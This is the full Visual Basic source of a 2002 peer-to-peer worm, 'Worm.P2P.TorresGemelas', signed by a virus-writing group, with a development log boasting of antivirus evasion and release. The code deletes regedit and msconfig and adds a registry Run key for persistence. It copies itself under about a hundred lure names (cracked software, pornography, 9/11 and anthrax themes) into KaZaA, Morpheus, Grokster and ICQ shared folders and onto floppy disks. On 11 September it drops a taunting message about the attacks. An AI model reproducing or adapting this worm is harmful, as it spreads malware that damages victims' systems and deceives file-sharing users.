   VERSION 5.00
   Begin VB.Form Source
      BackColor       =   &H00000000&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "Windows"
      ClientHeight    =   870
      ClientLeft      =   8490
      ClientTop       =   240
      ClientWidth     =   2220
      BeginProperty Font
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Icon            =   "Torres Gemelas.frx":0000
      LinkTopic       =   "Form1"
      MaxButton       =   0   'False
      MinButton       =   0   'False
      ScaleHeight     =   870
      ScaleWidth      =   2220
      ShowInTaskbar   =   0   'False
      Begin VB.Label Label3
         BackColor       =   &H00000000&
         Caption         =   " kuasanagui@rockeros.com"
         ForeColor       =   &H0080FFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   2
         Top             =   600
         Width           =   2055
      End
      Begin VB.Label Label2
         BackColor       =   &H00000000&
         Caption         =   " Por Kuasanagui/GEDZAC"
         ForeColor       =   &H0080FFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   1
         Top             =   360
         Width           =   1935
      End
      Begin VB.Label Label1
         BackColor       =   &H00000000&
         Caption         =   " Worm.P2P.TorresGemelas"
         ForeColor       =   &H0080FFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   0
         Top             =   120
         Width           =   2175
      End
   End
   Attribute VB_Name = "Source"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False
   Sub Information()
   '-----------------------------------------
   'Worm.P2P.TorresGemelas
   'Kuasanagui/GEDZAC
   'México  08/Sept/2002 - 17/Sept/2002
   'Kuasanagui@rockeros.com
   '-----------------------------------------
   End Sub
   Sub Bitacora()
   '----------------------------------------------------------------------------------------
   '08/Sept/2002  <<<<<< Se crea el esquema basico del worm
   '09/Sept/2002  <<<<<< Se corrigen bugs en las rutinas de infección
   '10/Sept/2002  <<<<<< Puede crear copias del worm con N nombres con extensiones EXE y SCR
   '11/Sept/2002  <<<<<< Se testeo del worm en Win98, WinMe, Win2000 y WinXP
   '                     Win98 = OK, WinMe = OK, Win2000= ERROR, WinXP = OK
   '12/Sept/2002  <<<<<< Nombres definidos para copias del worm para cada dia del mes
   '                     New payload: El 11 de Septiembre muestra una imagen de la torres.
   '13/Sept/2002  <<<<<< Correccion de un bug en las extensiones
   '14/Sept/2002  <<<<<<¡Norton Antivirus 2002 no detecta al worm!
   '15/Sept/2002  <<<<<< Testeo final con nuevas opciones
   '                     Win98 = OK, WinMe = OK, WinXP = OK, Win2000= ERROR
   '                     No infecta: Win2000 y WinNT
   '16/Sept/2002  <<<<<< Nuevas extensiones para worm: BAT, PIF Y COM
   '17/Sept/2002  <<<<<< EL WORM ES TERMINADO Y LIBERADO
   '----------------------------------------------------------------------------------------
   End Sub

   Private Sub Form_Load()

   On Error Resume Next

   If Month(Now()) = 9 And Day(Now()) = 11 Then ImagenGemelas.Show
   If Month(Now()) = 9 And Day(Now()) = 11 Then MsgBox "  ¿Te acuedas de esto?   ", 4096, "Torres Gemelas"
   Unload ImagenGemelas



   Set Torresgemelas = CreateObject("scripting.filesystemobject")
   Set Gemelas = CreateObject("WScript.Shell")

           Registrocheck = Gemelas.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\GEDZAC")

           If (Registrocheck = "0") Or (Registrocheck = "") Then

       Kill "C:\windows\regedit.exe"
       Kill "C:\Windows\System\Msconfig.exe"

   Set WTC = Torresgemelas.CreateTextFile("C:\Windows\Torres_Gemelas.TXT", True)
       WTC.WriteLine "--------------------------------------------------------------------------------------"
       WTC.WriteBlankLines "1"
       WTC.WriteLine "    A UN AÑO DEL WORLD TRADE CENTER"
       WTC.WriteBlankLines "2"
       WTC.WriteLine "Los eventos sucedidos el 11 de Septiembre de 2002"
       WTC.WriteLine "conmocionaron a todo el mundo. Era impredecible pensar"
       WTC.WriteLine "que la gran potencia mundial, fuera sorprendida con este"
       WTC.WriteLine "acto terrorista que deja en claro que no son los mas queridos."
       WTC.WriteBlankLines "2"
       WTC.WriteLine "Todos estamos a merced de estos terribles atentados."
       WTC.WriteLine "A un año despues...  ¿que es lo que sigue?..."
       WTC.WriteLine "¿El World Trade Center de la ciudad de Mexico?"
       WTC.WriteBlankLines "2"
       WTC.WriteLine "    ¿Seguro que tu puedes dormir tranquilo?"
       WTC.WriteBlankLines "1"
       WTC.WriteLine "--------------------------------------------------------------------------------------"
       WTC.Close

       Gemelas.run "C:\Windows\Torres_Gemelas.TXT"

       Gemelas.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\MessengerService\Policies\IMWarning", "¿Tus archivos estan a salvo de GEDZAC?"
       Gemelas.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\GEDZAC", "1"
       Gemelas.RegWrite "HKEY_CLASSES_ROOT\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\InfoTip", "¿Tus archivos estan a salvo de GEDZAC?"
       Gemelas.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\GEDZAC", "C:\Windows\Guindows\GEDZAC.EXE"
       Gemelas.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization", "GEDZAC" 'Para Win98 y WinMe
       Gemelas.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner", "Kuasanagui"    'Para Win98 y WinMe
       Gemelas.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOrganization", "GEDZAC" 'Para WinXP
       Gemelas.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOwner", "Kuasanagui" 'Para WinXP


            For Extension = 1 To 5

       If Extension = 1 Then XXX = ".exe"
       If Extension = 2 Then XXX = ".scr"
       If Extension = 3 Then XXX = ".bat"
       If Extension = 4 Then XXX = ".pif"
       If Extension = 5 Then XXX = ".com"

            For Kuasa = 1 To 100


   If Kuasa = 1 Then namefile = "Torres Gemelas"
   If Kuasa = 2 Then namefile = "WTC"
   If Kuasa = 3 Then namefile = "Osama Movie"
   If Kuasa = 4 Then namefile = "World Trade Center"
   If Kuasa = 5 Then namefile = "Afganistan"
   If Kuasa = 6 Then namefile = "Bin Laden and Bush_Fatal atraction"
   If Kuasa = 7 Then namefile = "Crack of Per Antivirus"
   If Kuasa = 8 Then namefile = "Crack Norton 2002"
   If Kuasa = 9 Then namefile = "Crack Hotmail"
   If Kuasa = 10 Then namefile = "Hackear Cuentas de Hotmail"
   If Kuasa = 11 Then namefile = "ICQ & MSN Hack-Tool"
   If Kuasa = 12 Then namefile = "Britney_XXX_Pasion_Anal"
   If Kuasa = 13 Then namefile = "Hotmail Hack"
   If Kuasa = 14 Then namefile = "The Matrix.mp3.exe"
   If Kuasa = 15 Then namefile = "Blink182.mp3"
   If Kuasa = 16 Then namefile = "Spiderman movie"
   If Kuasa = 17 Then namefile = "Spiderman Game"
   If Kuasa = 18 Then namefile = "Internet gratis"
   If Kuasa = 19 Then namefile = "Big Brother"
   If Kuasa = 20 Then namefile = "Norton Antivirus 2002 Crack"
   If Kuasa = 21 Then namefile = "Crack para Latinmail"
   If Kuasa = 22 Then namefile = "Microsoft Windows XP Crack"
   If Kuasa = 23 Then namefile = "Emulador de PX2"
   If Kuasa = 24 Then namefile = "Chistes de Osama"
   If Kuasa = 25 Then namefile = "Trucos de King of Figther"
   If Kuasa = 26 Then namefile = "Britney XXX Screen Saver"
   If Kuasa = 27 Then namefile = "KUASANAGUI-GEDZAC"
   If Kuasa = 28 Then namefile = "Codigos fuentes de Virus"
   If Kuasa = 29 Then namefile = "EL señor de los anillos"
   If Kuasa = 30 Then namefile = "Worm Generator"
   If Kuasa = 31 Then namefile = "AVP Crack"
   If Kuasa = 32 Then namefile = "Musulmanes"
   If Kuasa = 33 Then namefile = "Soda Estereo.mpeg"
   If Kuasa = 34 Then namefile = "Atentados Terroristas"
   If Kuasa = 35 Then namefile = "Hentai XXX ScreenSaver"
   If Kuasa = 36 Then namefile = "Star Wars Episodio II"
   If Kuasa = 37 Then namefile = "Padme Amidala"
   If Kuasa = 38 Then namefile = "EUA vs AFGANISTAN"
   If Kuasa = 39 Then namefile = "Script Hacker Mirc"
   If Kuasa = 40 Then namefile = "VX Trader Mails"
   If Kuasa = 41 Then namefile = "Osama Theme"
   If Kuasa = 42 Then namefile = "Persiana Americana.mp3"
   If Kuasa = 43 Then namefile = "Sexo Gratis"
   If Kuasa = 44 Then namefile = "Ataque militar a Irak"
   If Kuasa = 45 Then namefile = "Crack WinZip"
   If Kuasa = 46 Then namefile = "Virus en cuarentena"
   If Kuasa = 47 Then namefile = "Visual Basic Crack"
   If Kuasa = 48 Then namefile = "The Lord of the rings"
   If Kuasa = 49 Then namefile = "Postales sexuales"
   If Kuasa = 50 Then namefile = "Ataques Terroristas"
   If Kuasa = 51 Then namefile = "Atacan New York"
   If Kuasa = 52 Then namefile = "Terrorismo"
   If Kuasa = 53 Then namefile = "Torres Gemelas de Nueva York"
   If Kuasa = 54 Then namefile = "La Zona Cero de NY"
   If Kuasa = 55 Then namefile = "WTC Cementerio del Arte"
   If Kuasa = 56 Then namefile = "Tragedia de las Torres Gemelas"
   If Kuasa = 57 Then namefile = "ANTRAX"
   If Kuasa = 58 Then namefile = "Guerra Bacteriologica"
   If Kuasa = 59 Then namefile = "11 de Septiembre de 2001"
   If Kuasa = 60 Then namefile = "Al-Qaeda"
   If Kuasa = 61 Then namefile = "Osama Bin Laden"
   If Kuasa = 62 Then namefile = "La Leyenda de Osama"
   If Kuasa = 63 Then namefile = "AeroPitaras Suicidas"
   If Kuasa = 64 Then namefile = "Llega el Antrax a México"
   If Kuasa = 65 Then namefile = "Avionazo al Pentagono"
   If Kuasa = 66 Then namefile = "Hussein y Bin Laden"
   If Kuasa = 67 Then namefile = "Videos de Osama Bin Laden"
   If Kuasa = 68 Then namefile = "Bin Laden en México"
   If Kuasa = 69 Then namefile = "Muertes por Antrax"
   If Kuasa = 70 Then namefile = "Ana Kournikova XXX"
   If Kuasa = 71 Then namefile = "Shakira anal"
   If Kuasa = 72 Then namefile = "Britney anal"
   If Kuasa = 73 Then namefile = "Cameron Diaz anal"
   If Kuasa = 74 Then namefile = "Follar y Follar"
   If Kuasa = 75 Then namefile = "Sexo Pudor y Lagrimas"
   If Kuasa = 76 Then namefile = "Pokemon Movie"
   If Kuasa = 77 Then namefile = "Digimon"
   If Kuasa = 78 Then namefile = "La Leyenda de Zelda"
   If Kuasa = 79 Then namefile = "The Legend of Zelda"
   If Kuasa = 80 Then namefile = "El microbito.mp3"
   If Kuasa = 81 Then namefile = "Tom Crouse"
   If Kuasa = 82 Then namefile = "Pamela Anderson Pasion Anal"
   If Kuasa = 83 Then namefile = "Sexo ScreenSaver"
   If Kuasa = 84 Then namefile = "Final Fantasy"
   If Kuasa = 85 Then namefile = "Roms of PX2"
   If Kuasa = 86 Then namefile = "Dragon Ball Z"
   If Kuasa = 87 Then namefile = "Arroba Magazine"
   If Kuasa = 88 Then namefile = "Anastacia anal sex"
   If Kuasa = 89 Then namefile = "Operacion Triunfo"
   If Kuasa = 90 Then namefile = "Big Brother Vip"
   If Kuasa = 91 Then namefile = "Amores Perros screen Saver"
   If Kuasa = 92 Then namefile = "El Crimen del Padre Amaro.mpeg"
   If Kuasa = 93 Then namefile = "McAfee Crack"
   If Kuasa = 94 Then namefile = "WinZip"
   If Kuasa = 95 Then namefile = "Pamela Anderson Screen Saver"
   If Kuasa = 96 Then namefile = "Hentai Screen Saver"
   If Kuasa = 97 Then namefile = "Per Antivirus Crack"
   If Kuasa = 98 Then namefile = "Generador de passwords"
   If Kuasa = 99 Then namefile = "Shakira naked"
   If Kuasa = 100 Then namefile = "ASEREJE.mp3"


       Torresgemelas.createFolder "C:\Windows\Guindows"
       Torresgemelas.Copyfile ".\" & namefile & XXX, "C:\Windows\Guindows\GEDZAC.EXE"

       Next
           Next

           End If


       For Extension = 1 To 5

       If Extension = 1 Then XXX = ".exe"
       If Extension = 2 Then XXX = ".scr"
       If Extension = 3 Then XXX = ".bat"
       If Extension = 4 Then XXX = ".pif"
       If Extension = 5 Then XXX = ".com"

       For Kuasa = 1 To 100

   If Kuasa = 1 Then namefile = "Torres Gemelas"
   If Kuasa = 2 Then namefile = "WTC"
   If Kuasa = 3 Then namefile = "Osama Movie"
   If Kuasa = 4 Then namefile = "World Trade Center"
   If Kuasa = 5 Then namefile = "Afganistan"
   If Kuasa = 6 Then namefile = "Bin Laden and Bush_Fatal atraction"
   If Kuasa = 7 Then namefile = "Crack of Per Antivirus"
   If Kuasa = 8 Then namefile = "Crack Norton 2002"
   If Kuasa = 9 Then namefile = "Crack Hotmail"
   If Kuasa = 10 Then namefile = "Hackear Cuentas de Hotmail"
   If Kuasa = 11 Then namefile = "ICQ & MSN Hack-Tool"
   If Kuasa = 12 Then namefile = "Britney_XXX_Pasion_Anal"
   If Kuasa = 13 Then namefile = "Hotmail Hack"
   If Kuasa = 14 Then namefile = "The Matrix.mp3.exe"
   If Kuasa = 15 Then namefile = "Blink182.mp3"
   If Kuasa = 16 Then namefile = "Spiderman movie"
   If Kuasa = 17 Then namefile = "Spiderman Game"
   If Kuasa = 18 Then namefile = "Internet gratis"
   If Kuasa = 19 Then namefile = "Big Brother"
   If Kuasa = 20 Then namefile = "Norton Antivirus 2002 Crack"
   If Kuasa = 21 Then namefile = "Crack para Latinmail"
   If Kuasa = 22 Then namefile = "Microsoft Windows XP Crack"
   If Kuasa = 23 Then namefile = "Emulador de PX2"
   If Kuasa = 24 Then namefile = "Chistes de Osama"
   If Kuasa = 25 Then namefile = "Trucos de King of Figther"
   If Kuasa = 26 Then namefile = "Britney XXX Screen Saver"
   If Kuasa = 27 Then namefile = "KUASANAGUI-GEDZAC"
   If Kuasa = 28 Then namefile = "Codigos fuentes de Virus"
   If Kuasa = 29 Then namefile = "EL señor de los anillos"
   If Kuasa = 30 Then namefile = "Worm Generator"
   If Kuasa = 31 Then namefile = "AVP Crack"
   If Kuasa = 32 Then namefile = "Musulmanes"
   If Kuasa = 33 Then namefile = "Soda Estereo.mpeg"
   If Kuasa = 34 Then namefile = "Atentados Terroristas"
   If Kuasa = 35 Then namefile = "Hentai XXX ScreenSaver"
   If Kuasa = 36 Then namefile = "Star Wars Episodio II"
   If Kuasa = 37 Then namefile = "Padme Amidala"
   If Kuasa = 38 Then namefile = "EUA vs AFGANISTAN"
   If Kuasa = 39 Then namefile = "Script Hacker Mirc"
   If Kuasa = 40 Then namefile = "VX Trader Mails"
   If Kuasa = 41 Then namefile = "Osama Theme"
   If Kuasa = 42 Then namefile = "Persiana Americana.mp3"
   If Kuasa = 43 Then namefile = "Sexo Gratis"
   If Kuasa = 44 Then namefile = "Ataque militar a Irak"
   If Kuasa = 45 Then namefile = "Crack WinZip"
   If Kuasa = 46 Then namefile = "Virus en cuarentena"
   If Kuasa = 47 Then namefile = "Visual Basic Crack"
   If Kuasa = 48 Then namefile = "The Lord of the rings"
   If Kuasa = 49 Then namefile = "Postales sexuales"
   If Kuasa = 50 Then namefile = "Ataques Terroristas"
   If Kuasa = 51 Then namefile = "Atacan New York"
   If Kuasa = 52 Then namefile = "Terrorismo"
   If Kuasa = 53 Then namefile = "Torres Gemelas de Nueva York"
   If Kuasa = 54 Then namefile = "La Zona Cero de NY"
   If Kuasa = 55 Then namefile = "WTC Cementerio del Arte"
   If Kuasa = 56 Then namefile = "Tragedia de las Torres Gemelas"
   If Kuasa = 57 Then namefile = "ANTRAX"
   If Kuasa = 58 Then namefile = "Guerra Bacteriologica"
   If Kuasa = 59 Then namefile = "11 de Septiembre de 2001"
   If Kuasa = 60 Then namefile = "Al-Qaeda"
   If Kuasa = 61 Then namefile = "Osama Bin Laden"
   If Kuasa = 62 Then namefile = "La Leyenda de Osama"
   If Kuasa = 63 Then namefile = "AeroPitaras Suicidas"
   If Kuasa = 64 Then namefile = "Llega el Antrax a México"
   If Kuasa = 65 Then namefile = "Avionazo al Pentagono"
   If Kuasa = 66 Then namefile = "Hussein y Bin Laden"
   If Kuasa = 67 Then namefile = "Videos de Osama Bin Laden"
   If Kuasa = 68 Then namefile = "Bin Laden en México"
   If Kuasa = 69 Then namefile = "Muertes por Antrax"
   If Kuasa = 70 Then namefile = "Ana Kournikova XXX"
   If Kuasa = 71 Then namefile = "Shakira anal"
   If Kuasa = 72 Then namefile = "Britney anal"
   If Kuasa = 73 Then namefile = "Cameron Diaz anal"
   If Kuasa = 74 Then namefile = "Follar y Follar"
   If Kuasa = 75 Then namefile = "Sexo Pudor y Lagrimas"
   If Kuasa = 76 Then namefile = "Pokemon Movie"
   If Kuasa = 77 Then namefile = "Digimon"
   If Kuasa = 78 Then namefile = "La Leyenda de Zelda"
   If Kuasa = 79 Then namefile = "The Legend of Zelda"
   If Kuasa = 80 Then namefile = "El microbito.mp3"
   If Kuasa = 81 Then namefile = "Tom Crouse"
   If Kuasa = 82 Then namefile = "Pamela Anderson Pasion Anal"
   If Kuasa = 83 Then namefile = "Sexo ScreenSaver"
   If Kuasa = 84 Then namefile = "Final Fantasy"
   If Kuasa = 85 Then namefile = "Roms of PX2"
   If Kuasa = 86 Then namefile = "Dragon Ball Z"
   If Kuasa = 87 Then namefile = "Arroba Magazine"
   If Kuasa = 88 Then namefile = "Anastacia anal sex"
   If Kuasa = 89 Then namefile = "Operacion Triunfo"
   If Kuasa = 90 Then namefile = "Big Brother Vip"
   If Kuasa = 91 Then namefile = "Amores Perros screen Saver"
   If Kuasa = 92 Then namefile = "El Crimen del Padre Amaro.mpeg"
   If Kuasa = 93 Then namefile = "McAfee Crack"
   If Kuasa = 94 Then namefile = "WinZip"
   If Kuasa = 95 Then namefile = "Pamela Anderson Screen Saver"
   If Kuasa = 96 Then namefile = "Hentai Screen Saver"
   If Kuasa = 97 Then namefile = "Per Antivirus Crack"
   If Kuasa = 98 Then namefile = "Generador de passwords"
   If Kuasa = 99 Then namefile = "Shakira naked"
   If Kuasa = 100 Then namefile = "ASEREJE.mp3"


       directorio = "C:\Windows\Guindows\GEDZAC.EXE"

       Torresgemelas.Copyfile directorio, "C:\Program Files\Grokster\My Grokster\" & namefile & XXX
       Torresgemelas.Copyfile directorio, "C:\ARCHIV~1\Grokster\My Grokster\" & namefile & XXX

       Torresgemelas.Copyfile directorio, "C:\Program Files\Morpheus\My Shared Folder\" & namefile & XXX
       Torresgemelas.Copyfile directorio, "C:\archiv~1\Morpheus\My Shared Folder\" & namefile & XXX

       Torresgemelas.Copyfile directorio, "C:\Program Files\ICQ\shared files\" & namefile & XXX
       Torresgemelas.Copyfile directorio, "C:\archiv~1\ICQ\shared files\" & namefile & XXX

       Torresgemelas.Copyfile directorio, "C:\Program Files\KaZaA\My Shared Folder\" & namefile & XXX
       Torresgemelas.Copyfile directorio, "C:\ARCHIV~1\KaZaA\My Shared Folder\" & namefile & XXX

   Next

   Next


       Do


   On Error Resume Next

      i = i + 1
       Randomize Timer
       If i = 6000000 Then


              Kuasa = Day(Now())
              Extension = Month(Now())

   If Extension = 1 Then XXX = ".bat"
   If Extension = 2 Then XXX = ".scr"
   If Extension = 3 Then XXX = ".pif"
   If Extension = 4 Then XXX = ".com"
   If Extension = 5 Then XXX = ".bat"
   If Extension = 6 Then XXX = ".exe"
   If Extension = 7 Then XXX = ".scr"
   If Extension = 8 Then XXX = ".exe"
   If Extension = 9 Then XXX = ".exe"
   If Extension = 10 Then XXX = ".exe"
   If Extension = 11 Then XXX = ".pif"
   If Extension = 12 Then XXX = ".com"

   If Kuasa = 1 Then namefile = "Ataque militar a Irak"
   If Kuasa = 2 Then namefile = "WTC"
   If Kuasa = 3 Then namefile = "Osama Movie"
   If Kuasa = 4 Then namefile = "World Trade Center"
   If Kuasa = 5 Then namefile = "Afganistan"
   If Kuasa = 6 Then namefile = "Chistes de Osama"
   If Kuasa = 7 Then namefile = "Musulmanes"
   If Kuasa = 8 Then namefile = "Atentados Terrorista"
   If Kuasa = 9 Then namefile = "EUA vs AFGANISTAN"
   If Kuasa = 10 Then namefile = "Osama Theme"
   If Kuasa = 11 Then namefile = "Torres Gemelas"
   If Kuasa = 12 Then namefile = "Ataques Terroristas"
   If Kuasa = 13 Then namefile = "Atacan New York"
   If Kuasa = 14 Then namefile = "Terrorismo"
   If Kuasa = 15 Then namefile = "Torres Gemelas de Nueva York"
   If Kuasa = 16 Then namefile = "La Zona Cero de NY"
   If Kuasa = 17 Then namefile = "WTC Cementerio del Arte"
   If Kuasa = 18 Then namefile = "Tragedia de las Torres Gemelas"
   If Kuasa = 19 Then namefile = "ANTRAX"
   If Kuasa = 20 Then namefile = "Guerra Bacteriologica"
   If Kuasa = 21 Then namefile = "11 de Septiembre de 2001"
   If Kuasa = 22 Then namefile = "Al-Qaeda"
   If Kuasa = 23 Then namefile = "Osama Bin Laden"
   If Kuasa = 24 Then namefile = "La Leyenda de Osama"
   If Kuasa = 25 Then namefile = "AeroPitaras Suicidas"
   If Kuasa = 26 Then namefile = "Llega el Antrax a México"
   If Kuasa = 27 Then namefile = "Avionazo al Pentagono"
   If Kuasa = 28 Then namefile = "Hussein y Bin Laden"
   If Kuasa = 29 Then namefile = "Videos de Osama Bin Laden"
   If Kuasa = 30 Then namefile = "Bin Laden en México"
   If Kuasa = 31 Then namefile = "Antrax en México"

              Torresgemelas.Copyfile directorio, "A:\" & namefile & XXX

               i = 0
       End If
    Loop

     End Sub
